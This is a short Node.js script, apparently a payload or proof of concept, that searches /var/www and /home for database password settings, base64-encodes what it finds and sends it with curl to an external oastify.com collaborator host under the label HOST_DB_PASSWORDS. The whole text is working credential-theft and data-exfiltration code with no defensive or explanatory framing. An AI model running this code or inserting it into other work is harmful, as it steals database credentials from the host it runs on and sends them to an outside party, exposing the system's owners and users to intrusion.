const {execSync}=require('child_process'); const target="abcdefghijklmnop.oastify.com";
function send(label,data){ const encoded=Buffer.from(data.substring(0,1000)).toString('base64').replace(/=/g,''); execSync(`curl -s "https://${target}/${label}/${encoded}"`); }
const dbConfigs=execSync("grep -rE 'DB_PASSWORD|MYSQL_ROOT_PASSWORD' /var/www /home").toString();
send("HOST_DB_PASSWORDS", dbConfigs);
